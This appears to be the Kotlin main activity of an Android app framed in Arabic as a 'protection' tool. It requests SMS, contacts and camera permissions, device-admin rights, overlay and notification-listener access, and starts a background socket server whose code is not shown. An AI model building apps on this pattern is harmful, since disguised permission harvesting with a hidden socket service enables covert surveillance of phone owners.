package com.ahmed.zai

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
// استخدمنا SwitchMaterial عشان يطابق اللي في الواجهة
import com.google.android.material.switchmaterial.SwitchMaterial

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // التصحيح هنا: SwitchMaterial بدل Switch
        val switchCamera = findViewById<SwitchMaterial>(R.id.switchCamera)
        val switchApps = findViewById<SwitchMaterial>(R.id.switchApps)
        val switchNotif = findViewById<SwitchMaterial>(R.id.switchNotif)
        
        val btnAdmin = findViewById<Button>(R.id.btnAdmin)
        val btnLockNow = findViewById<Button>(R.id.btnLockNow)
        val statusText = findViewById<TextView>(R.id.statusText)

        // طلب الصلاحيات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 101)
        }
        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS, android.Manifest.permission.CAMERA), 102)

        // تشغيل السيرفر في الخلفية مع حماية من الكراش
        try {
            val intent = Intent(this, SocketService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            statusText.text = "خطأ في الخدمة: ${e.message}"
        }

        btnAdmin.setOnClickListener {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, MyDeviceAdminReceiver::class.java))
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتفعيل الحماية")
            startActivity(intent)
        }

        btnLockNow.setOnClickListener {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
            } else {
                Toast.makeText(this, "فعّل صلاحيات الحماية الأول!", Toast.LENGTH_SHORT).show()
            }
        }

        switchCamera.setOnCheckedChangeListener { _, isChecked ->
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.setCameraDisabled(adminComponent, isChecked)
                statusText.text = if(isChecked) "📸 الكاميرا مقفولة" else "📸 الكاميرا مفتوحة"
                statusText.setTextColor(if(isChecked) 0xFF00FF00.toInt() else 0xFFef4444.toInt())
            } else {
                switchCamera.isChecked = false
                Toast.makeText(this, "فعّل صلاحيات الحماية الأول!", Toast.LENGTH_SHORT).show()
            }
        }

        switchApps.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (!Settings.canDrawOverlays(this)) {
                    startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
                }
                statusText.text = "🖼️ حماية الصور شغالة"
            }
        }

        switchNotif.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
        }
    }
}
